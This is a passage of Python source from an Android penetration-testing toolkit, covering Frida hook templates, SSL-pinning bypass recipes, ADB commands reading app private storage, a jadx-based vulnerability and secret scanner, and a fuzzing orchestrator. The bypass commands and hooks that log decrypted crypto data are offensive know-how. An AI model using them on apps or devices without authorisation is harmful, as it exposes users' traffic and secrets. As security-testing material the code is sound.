        "crypto_monitor": {
            "name": "Crypto Monitor",
            "category": "Crypto",
            "desc": "Monitor Cipher.doFinal and Mac.doFinal calls with input/output",
            "code": """Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(data) {
        console.log('[CRYPTO] doFinal input: ' +
            Java.use('android.util.Base64').encodeToString(data, 0));
        var result = this.doFinal(data);
        console.log('[CRYPTO] doFinal output: ' +
            Java.use('android.util.Base64').encodeToString(result, 0));
        return result;
    };
    var Mac = Java.use('javax.crypto.Mac');
    Mac.doFinal.overload().implementation = function() {
        var result = this.doFinal();
        console.log('[HMAC] ' + bytesToHex(result));
        return result;
    };
    function bytesToHex(bytes) {
        return Array.from(bytes).map(function(b){ return ('0' + (b & 0xFF).toString(16)).slice(-2); }).join('');
    }
    console.log('[+] Crypto monitor active');
});""",
        },
        "sql_monitor": {
            "name": "SQL Monitor",
            "category": "SQL",
            "desc": "Hook SQLiteDatabase rawQuery, execSQL, and query methods",
            "code": """Java.perform(function() {
    var DB = Java.use('android.database.sqlite.SQLiteDatabase');
    DB.rawQuery.overload('java.lang.String','[Ljava.lang.String;').implementation = function(sql, args) {
        console.log('[SQL] rawQuery: ' + sql);
        if(args) console.log('  args: ' + args.join(', '));
        return this.rawQuery(sql, args);
    };
    DB.execSQL.overload('java.lang.String').implementation = function(sql) {
        console.log('[SQL] execSQL: ' + sql);
        return this.execSQL(sql);
    };
    DB.query.overload('java.lang.String','[Ljava.lang.String;','java.lang.String','[Ljava.lang.String;','java.lang.String','java.lang.String','java.lang.String')
        .implementation = function(table,cols,sel,selArgs,gb,having,ob) {
            console.log('[SQL] query table=' + table + ' WHERE ' + sel);
            return this.query(table,cols,sel,selArgs,gb,having,ob);
        };
    console.log('[+] SQL monitor active');
});""",
        },
        "http_intercept": {
            "name": "HTTP Intercept",
            "category": "HTTP",
            "desc": "Hook URL.openConnection and detect OkHttp/Retrofit/Volley frameworks",
            "code": """Java.perform(function() {
    try {
        var Builder = Java.use('okhttp3.OkHttpClient$Builder');
        var Interceptor = Java.use('okhttp3.Interceptor');
        console.log('[+] OkHttp3 found, hooking requests...');
    } catch(e) {}
    var URL = Java.use('java.net.URL');
    URL.openConnection.overload().implementation = function() {
        console.log('[HTTP] Connection to: ' + this.toString());
        return this.openConnection();
    };
    Java.enumerateLoadedClasses({
        onMatch: function(name) {
            if(name.includes('okhttp3.Request') || name.includes('retrofit2')) {
                console.log('[HTTP] Framework detected: ' + name);
            }
        },
        onComplete: function(){}
    });
    console.log('[+] HTTP intercept active');
});""",
        },
    }

    SSL_BYPASS_METHODS = [
        {
            "name": "Frida SSL Kill Switch 2",
            "desc": "Universal SSL pinning bypass via Frida codeshare",
            "difficulty": "Easy",
            "command": "frida --codeshare akabe4/frida-multiple-unpinning -U -f {pkg}",
            "steps": [
                "Install frida-tools: pip install frida-tools",
                "Push frida-server to device",
                "Run: frida --codeshare akabe4/frida-multiple-unpinning -U -f {pkg}",
            ],
        },
        {
            "name": "objection SSL Bypass",
            "desc": "Bypass via objection REPL",
            "difficulty": "Easy",
            "command": "objection -g {pkg} explore --startup-command 'android sslpinning disable'",
            "steps": [
                "Install objection: pip install objection",
                "Ensure frida-server is running",
                "Run: objection -g {pkg} explore --startup-command 'android sslpinning disable'",
            ],
        },
        {
            "name": "Magisk TrustMeAlready",
            "desc": "System-wide SSL bypass via Magisk module",
            "difficulty": "Medium",
            "command": "",
            "steps": [
                "Install Magisk on rooted device",
                "Download TrustMeAlready module from Magisk repo",
                "Enable module and reboot",
            ],
        },
        {
            "name": "Network Security Config",
            "desc": "Patch APK network_security_config.xml to trust user CAs",
            "difficulty": "Medium",
            "command": "apktool d app.apk && apktool b app_patched -o patched.apk",
            "steps": [
                "Decompile APK: apktool d app.apk",
                "Edit res/xml/network_security_config.xml to add <trust-anchors><certificates src='user'/></trust-anchors>",
                "Rebuild: apktool b app_patched -o patched.apk",
                "Sign: jarsigner or apksigner",
            ],
        },
        {
            "name": "Xposed SSLUnpinning",
            "desc": "Use LSPosed + JustTrustMe for persistent bypass",
            "difficulty": "Hard",
            "command": "",
            "steps": [
                "Install LSPosed (Zygisk) on rooted device",
                "Install JustTrustMe module",
                "Enable for target app and reboot",
            ],
        },
        {
            "name": "Burp Proxy + User CA",
            "desc": "Install Burp CA cert manually",
            "difficulty": "Easy",
            "command": "adb push burp.der /sdcard/ && adb shell am start -a android.settings.SECURITY_SETTINGS",
            "steps": [
                "Export Burp CA cert (DER format)",
                "Push to device: adb push burp.der /sdcard/",
                "Install: Settings → Security → Install from storage",
                "Or use Traffic Inspector page for automated install",
            ],
        },
    ]

    def get_frida_templates(self, package: str = "") -> list[dict]:
        """Return all Frida script templates, with package placeholder filled."""
        result = []
        for key, tpl in self.FRIDA_TEMPLATES.items():
            code = tpl["code"].replace("{pkg}", package) if package else tpl["code"]
            result.append({
                "key": key,
                "name": tpl["name"],
                "category": tpl["category"],
                "desc": tpl["desc"],
                "code": code,
            })
        return result

    def get_ssl_bypass_methods(self, package: str = "") -> list[dict]:
        """Return all SSL bypass methods with package placeholder filled."""
        return [
            {**m, "command": m["command"].replace("{pkg}", package) if package else m["command"],
             "steps": [s.replace("{pkg}", package) for s in m["steps"]] if package else m["steps"]}
            for m in self.SSL_BYPASS_METHODS
        ]

    # ── Auto ADB Commands (matches AndroHunter AutoAdbScreen) ──

    AUTO_ADB_COMMANDS = {
        "App Info": [
            ("Package info", "dumpsys package {pkg}"),
            ("APK path", "pm path {pkg}"),
            ("App permissions", "dumpsys package {pkg} | grep permission"),
            ("Running processes", "ps -A | grep {pkg}"),
            ("UID info", "dumpsys package {pkg} | grep userId"),
        ],
        "Storage": [
            ("SharedPrefs files", "run-as {pkg} ls shared_prefs/ 2>/dev/null || su 0 ls /data/data/{pkg}/shared_prefs/"),
            ("Databases", "run-as {pkg} ls databases/ 2>/dev/null || su 0 ls /data/data/{pkg}/databases/"),
            ("Internal files", "run-as {pkg} ls files/ 2>/dev/null || su 0 ls /data/data/{pkg}/files/"),
            ("External data", "ls /sdcard/Android/data/{pkg}/ 2>/dev/null"),
            ("Cache", "run-as {pkg} ls cache/ 2>/dev/null"),
        ],
        "Network": [
            ("Open connections", "netstat -tlnp 2>/dev/null || ss -tlnp"),
            ("DNS servers", "getprop net.dns1 && getprop net.dns2"),
            ("WiFi info", "dumpsys wifi | grep -i 'ssid\\|ip'"),
            ("HTTP proxy", "settings get global http_proxy"),
            ("Network security config", "dumpsys package {pkg} | grep -i network"),
        ],
        "Security": [
            ("SELinux status", "getenforce"),
            ("Root check", "which su 2>/dev/null && echo ROOTED || echo NOT_ROOTED"),
            ("Debuggable?", "dumpsys package {pkg} | grep -i debug"),
            ("Backup allowed?", "dumpsys package {pkg} | grep -i backup"),
            ("Exported components", "dumpsys package {pkg} | grep exported=true"),
        ],
        "Logcat": [
            ("Recent app logs", "logcat -d -t 50 | grep -i {pkg}"),
            ("Errors only", "logcat -d -t 100 *:E | grep -i {pkg}"),
            ("Clear logcat", "logcat -c"),
        ],
    }

    async def run_auto_adb(self, package: str, command_template: str) -> dict:
        """Run an ADB command with package placeholder replaced."""
        cmd = command_template.replace("{pkg}", package)
        result = await self._shell(cmd, timeout=15)
        return {"success": True, "command": cmd, "output": result}

    def get_auto_adb_commands(self, package: str = "") -> dict:
        """Return organized ADB command categories."""
        result = {}
        for cat, cmds in self.AUTO_ADB_COMMANDS.items():
            result[cat] = [
                {"label": label, "command": cmd.replace("{pkg}", package) if package else cmd}
                for label, cmd in cmds
            ]
        return result

    async def scan_source_vulnerabilities(self, apk_path: str,
                                           progress_cb: Optional[Callable] = None) -> dict:
        """Decompile APK and scan Java source for code-level vulnerabilities.
        Uses jadx to get real source context for accurate detection."""
        import tempfile
        findings = []

        if not os.path.exists(apk_path):
            return {"success": False, "error": "APK not found", "findings": []}

        jadx_path = shutil.which("jadx")
        if not jadx_path:
            return {"success": False, "error": "jadx not installed", "findings": []}

        if progress_cb:
            await progress_cb("hunter", 10, "Decompiling APK with jadx...")

        with tempfile.TemporaryDirectory(prefix="hunter_src_") as tmpdir:
            proc = await asyncio.create_subprocess_exec(
                jadx_path, "-d", tmpdir, "--no-res", apk_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, _ = await asyncio.wait_for(proc.communicate(), timeout=120)

            java_files = []
            xml_files = []
            for root, _dirs, files in os.walk(tmpdir):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    rel = os.path.relpath(fpath, tmpdir)
                    if fname.endswith(".java"):
                        if "/android/" in rel and "/insecure" not in rel.lower():
                            continue
                        java_files.append((rel, fpath))
                    elif fname.endswith(".xml") and ("/res/" in rel or "/values/" in rel or fname == "AndroidManifest.xml"):
                        xml_files.append((rel, fpath))

            if progress_cb:
                await progress_cb("hunter", 35, f"Scanning {len(java_files)} source + {len(xml_files)} XML files...")

            seen = set()
            for i, (rel_path, fpath) in enumerate(java_files):
                try:
                    with open(fpath, "r", errors="replace") as f:
                        content = f.read()
                except Exception:
                    continue

                class_name = os.path.splitext(os.path.basename(fpath))[0]

                for label, info in DEX_CODE_PATTERNS.items():
                    for m in re.finditer(info["pattern"], content):
                        match_text = m.group(0)
                        line_no = content[:m.start()].count("\n") + 1

                        ctx_start = max(0, m.start() - 80)
                        ctx_end = min(len(content), m.end() + 80)
                        context = content[ctx_start:ctx_end].strip()

                        dedup_key = (label, class_name)
                        if dedup_key in seen:
                            continue
                        seen.add(dedup_key)

                        findings.append({
                            "severity": info["severity"],
                            "category": info["category"],
                            "title": f"{info['title']}",
                            "description": info["description"],
                            "location": f"{rel_path}:{line_no}",
                            "evidence": context[:400],
                            "classification": "VULN" if info["severity"] in ("CRITICAL", "HIGH") else "SUSP",
                            "recommendation": info["recommendation"],
                            "class": class_name,
                        })

                for sec_label, (pattern, sev_class) in DEX_SECRET_PATTERNS.items():
                    for m in re.finditer(pattern, content):
                        val = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
                        if not val or len(val) < 8:
                            continue
                        dedup_key = (sec_label, val[:60])
                        if dedup_key in seen:
                            continue
                        seen.add(dedup_key)
                        line_no = content[:m.start()].count("\n") + 1
                        sev_map = {"VULN": "CRITICAL", "SUSP": "MEDIUM", "INFO": "LOW"}
                        findings.append({
                            "severity": sev_map.get(sev_class, "MEDIUM"),
                            "category": f"Source Secrets/{sec_label}",
                            "title": f"{sec_label} in {class_name}",
                            "description": val[:200],
                            "location": f"{rel_path}:{line_no}",
                            "evidence": val[:300],
                            "classification": sev_class,
                            "recommendation": "Remove hardcoded secrets; use Android Keystore or server-side config",
                            "class": class_name,
                        })

        if progress_cb:
            await progress_cb("hunter", 90, f"Scanning {len(xml_files)} XML resources...")

        for rel_path, fpath in xml_files:
            try:
                with open(fpath, "r", errors="replace") as f:
                    content = f.read()
            except Exception:
                continue

            fname = os.path.basename(fpath)

            _skip_xml = {"title_activity_", "hint_", "label_", "app_name", "action_settings",
                         "loginscreen_password", "loginscreen_username", "button_"}
            if "strings.xml" in fname or "values" in rel_path:
                for m in re.finditer(r'<string\s+name="([^"]*(?:is_admin|is_root|is_debug|admin_mode|debug_mode|secret_key|api_key|master_password)[^"]*)"[^>]*>([^<]+)</string>', content, re.IGNORECASE):
                    name_attr, value = m.group(1), m.group(2)
                    if any(name_attr.startswith(skip) for skip in _skip_xml):
                        continue
                    dedup_key = ("xml_auth_flag", name_attr)
                    if dedup_key in seen:
                        continue
                    seen.add(dedup_key)
                    findings.append({
                        "severity": "MEDIUM",
                        "category": "Weak Authentication",
                        "title": f"Patchable auth/config flag: {name_attr}={value}",
                        "description": f"String resource '{name_attr}' with value '{value}' can be patched by recompiling the APK to bypass client-side checks",
                        "location": rel_path,
                        "evidence": m.group(0)[:200],
                        "classification": "SUSP",
                        "recommendation": "Move authorization to server-side; never rely on client-side resource flags",
                    })

            if "/layout" in rel_path:
                edittexts = list(re.finditer(r'<EditText[^>]*>', content, re.DOTALL))
                for m in edittexts:
                    tag = m.group(0)
                    eid = re.search(r'android:id="@\+id/([^"]+)"', tag)
                    eid_name = eid.group(1) if eid else "unknown"
                    is_sensitive = any(kw in eid_name.lower() for kw in ("password", "passwd", "pin", "secret", "account", "credit", "ssn"))
                    has_input_type = "android:inputType" in tag
                    has_no_suggest = "textNoSuggestions" in tag or "textPassword" in tag
                    if is_sensitive and not has_no_suggest:
                        dedup_key = ("keyboard_cache", eid_name)
                        if dedup_key in seen:
                            continue
                        seen.add(dedup_key)
                        findings.append({
                            "severity": "MEDIUM",
                            "category": "Information Leakage",
                            "title": f"Keyboard cache risk on sensitive field: {eid_name}",
                            "description": "Sensitive EditText field without textPassword/textNoSuggestions inputType — keyboard may cache typed data",
                            "location": rel_path,
                            "evidence": tag[:200],
                            "classification": "SUSP",
                            "recommendation": "Set android:inputType='textPassword' or 'textNoSuggestions' and android:importantForAutofill='no'",
                        })

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        findings.sort(key=lambda f: sev_order.get(f["severity"], 9))

        if progress_cb:
            await progress_cb("hunter", 100, f"Source scan complete: {len(findings)} vulnerabilities")

        return {
            "success": True,
            "findings": findings,
            "total_findings": len(findings),
            "files_scanned": len(java_files),
        }

    async def full_hunt(self, package: str, apk_path: str = None,
                         progress_cb: Optional[Callable] = None) -> dict:
        """Run all AndroHunter modules on a package."""
        all_findings = []
        module_results = {}

        async def sub_progress(agent, pct, msg):
            if progress_cb:
                await progress_cb("hunter", pct, msg)

        modules = [
            ("intent_fuzzer", lambda: self.fuzz_intents(package, sub_progress)),
            ("provider_fuzzer", lambda: self.fuzz_providers(package, sub_progress)),
            ("broadcast_fuzzer", lambda: self.fuzz_broadcasts(package, sub_progress)),
            ("task_hijack", lambda: self.check_task_hijack(package, sub_progress)),
            ("shared_prefs", lambda: self.read_shared_prefs(package, sub_progress)),
            ("manifest", lambda: self.analyze_manifest(package, sub_progress)),
        ]

        if apk_path and os.path.exists(apk_path):
            modules.append(("fileprovider", lambda: self.analyze_fileproviders(package, apk_path, sub_progress)))
            modules.append(("dex_secrets", lambda: self.scan_dex_secrets(apk_path, sub_progress)))
            modules.append(("source_scan", lambda: self.scan_source_vulnerabilities(apk_path, sub_progress)))

        for i, (name, fn) in enumerate(modules):
            if progress_cb:
                await progress_cb("hunter", int((i / len(modules)) * 100), f"Running {name}...")
            try:
                result = await fn()
                module_results[name] = result
                all_findings.extend(result.get("findings", []))
            except Exception as e:
                module_results[name] = {"success": False, "error": str(e), "findings": []}

        if progress_cb:
            await progress_cb("hunter", 100, f"Hunt complete: {len(all_findings)} findings")

        return {
            "success": True,
            "findings": all_findings,
            "modules": module_results,
            "total_findings": len(all_findings),
        }


# ──────────────────────────────────────────────
# UNIFIED AGENT MANAGER
# ──────────────────────────────────────────────
class AgentManager:
    def __init__(self, adb_path: str = ADB_PATH):
        self.fridump = FridumpAgent()
        self.semgrep = SemgrepAgent()
        self.owasp = OWASPChecker(adb_path)
        self.drozer = DrozerAgent(adb_path)
        self.medusa = MedusaAgent()
        self.hunter = AndroHunterAgent(adb_path)

    async def get_all_status(self) -> list[dict]:
        return [
            {
                "name": "fridump",
                "icon": "memory",
                "installed": self.fridump.is_available(),
                "version": "local",
                "description": "Frida-based memory dumper – dump process memory and extract strings",
                "capabilities": ["memory_dump", "string_extraction", "sensitive_data_search", "credential_hunting"],
            },
            {
                "name": "semgrep",
                "icon": "scan",
                "installed": self.semgrep.is_available(),
                "version": "semgrep" if shutil.which("semgrep") else "not installed",
                "description": f"MASVS static analysis – {len(self.semgrep.list_rules())} rules across storage/platform/network/crypto/code",
                "capabilities": [r["id"] for r in self.semgrep.list_rules()[:15]],
                "install_cmd": "pip install semgrep" if not shutil.which("semgrep") else None,
            },
            {
                "name": "owasp",
                "icon": "shield",
                "installed": True,
                "version": "built-in",
                "description": "OWASP Mobile Top 10 automated checks (M1-M10)",
                "capabilities": ["M1-Platform", "M2-Storage", "M3-Communication", "M4-Auth", "M5-Crypto", "M7-CodeQuality", "M8-Tampering", "M9-ReverseEng", "M10-Extraneous"],
            },
            {
                "name": "drozer",
                "icon": "microscope",
                "installed": self.drozer.is_installed(),
                "version": "",
                "description": "Android security assessment framework – component scanning, SQL injection, path traversal",
                "capabilities": ["attacksurface", "provider.injection", "provider.traversal", "activity.browsable", "readable/writable files"],
                "install_cmd": "pipx install drozer" if not self.drozer.is_installed() else None,
            },
            {
                "name": "medusa",
                "icon": "hook",
                "installed": self.medusa.is_available(),
                "version": "local",
                "description": f"Dynamic analysis framework – {len(self.medusa.list_modules())} hook modules, {len(self.medusa.list_snippets())} snippets",
                "capabilities": [m["name"] for m in self.medusa.list_modules()[:15]],
            },
            {
                "name": "hunter",
                "icon": "crosshair",
                "installed": True,
                "version": "built-in",
                "description": "AndroHunter – 12 modules: Intent/Provider/Broadcast fuzzing, FileProvider, StrandHogg, DEX secrets, SharedPrefs, Manifest, Frida Gen, SSL Bypass, Activity Launcher, Auto ADB",
                "capabilities": [
                    "intent_fuzzer", "provider_fuzzer", "broadcast_fuzzer",
                    "fileprovider_analyzer", "task_hijack", "dex_secrets",
                    "shared_prefs_reader", "manifest_viewer", "frida_generator",
                    "ssl_bypass_guide", "activity_launcher", "auto_adb",
                ],
            },
        ]
